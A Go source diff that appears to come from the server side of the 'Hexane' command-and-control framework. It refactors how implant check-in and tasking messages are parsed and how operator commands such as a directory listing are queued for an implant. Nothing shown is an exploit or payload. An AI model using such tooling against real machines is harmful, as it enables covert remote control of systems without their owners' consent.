@@ -6,7 +6,9 @@ import (
 	"strings"
 )
 
-func (m *Parser) DispatchCommand(h *HexaneConfig, s *Stream, UserInput string) {
+const HeaderLength = 12
+
+func (m *Parser) DispatchCommand(s *Stream, UserInput string) {
 	var (
 		Buffer      []string
 		Arguments   []string
@@ -20,13 +22,13 @@ func (m *Parser) DispatchCommand(h *HexaneConfig, s *Stream, UserInput string) {
 	Arguments = append(Arguments, Buffer[1:]...)
 	Args := strings.Join(Arguments, " ")
 
-	h.Implant.CurrentTaskId++
 	for k, v := range CommandMap {
 		if Command == "" {
 			CommandType = CommandNoJob
 			break
 		}
 		if strings.EqualFold(k, Command) {
+			fmt.Printf("command to send is %s\n", k)
 			CommandType = v
 		}
 	}
@@ -37,6 +39,7 @@ func (m *Parser) DispatchCommand(h *HexaneConfig, s *Stream, UserInput string) {
 
 func (s *Stream) CreateHeader(Parser *Parser, msgType uint32, taskId uint32) {
 
+	WrapMessage("DBG", "Creating response header")
 	s.AddDword(Parser.PeerId)
 	s.AddDword(taskId)
 	s.AddDword(msgType)
@@ -49,10 +52,6 @@ func (h *HexaneConfig) HandleCheckin(Parser *Parser, Stream *Stream) {
 
 	if Parser.ParserPrintData(TypeCheckin) {
 		Stream.CreateHeader(Parser, TypeCheckin, uint32(h.TaskCounter))
-
-		if debug {
-			PrintBytes(Stream.Buffer)
-		}
 	}
 }
 
@@ -62,35 +61,42 @@ func (h *HexaneConfig) HandleCommand(Parser *Parser, Stream *Stream) {
 	defer h.mu.Unlock()
 
 	Stream.CreateHeader(Parser, TypeTasking, uint32(h.TaskCounter))
-	Parser.DispatchCommand(h, Stream, "dir C:/Users/lemur") // user command interface
-
-	if debug {
-		PrintBytes(Stream.Buffer)
-	}
+	Parser.DispatchCommand(Stream, "dir C:/Users/lemur") // user command interface
 }
 
 func ParseMessage(body []byte) ([]byte, error) {
 	var (
 		err     error
+		Offset  uint32
 		Parser  *Parser
 		implant *HexaneConfig
 		stream  = new(Stream)
 	)
 
-	for body != nil {
-		fmt.Println("message body: ")
-		PrintBytes(body)
+	for len(body) > 0 {
+		if len(body) < HeaderLength {
+			break
+		}
 
 		Parser = CreateParser(body)
 
-		Parser.PeerId = Parser.ParseDword()
-		Parser.TaskId = Parser.ParseDword()
-		Parser.MsgType = Parser.ParseDword()
+		Parser.PeerId = bits.ReverseBytes32(Parser.ParseDword())
+		Parser.TaskId = bits.ReverseBytes32(Parser.ParseDword())
+		Parser.MsgType = bits.ReverseBytes32(Parser.ParseDword())
 
-		Length := bits.ReverseBytes32(Parser.ParseDword())
-		Length += 16
+		if len(body) >= HeaderLength+4 {
 
-		fmt.Printf("parsing buffer of %d\n", Length)
+			Offset = Parser.ParseDword()
+			Offset += HeaderLength + 4
+
+		} else {
+			Offset = HeaderLength
+		}
+
+		if Offset > uint32(len(body)) {
+			break
+		}
+
 		if implant = GetConfigByPeerId(Parser.PeerId); implant != nil {
 
 			WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", Parser.PeerId))
@@ -131,12 +137,9 @@ func ParseMessage(body []byte) ([]byte, error) {
 			stream.Buffer = []byte("ok")
 		}
 
-		if len(body) >= int(Length) {
-			body = body[Length:]
-		} else {
-			body = nil
-		}
+		body = body[Offset:]
 	}
 
+	fmt.Println("!! BREAK !!")
 	return stream.Buffer, err
 }
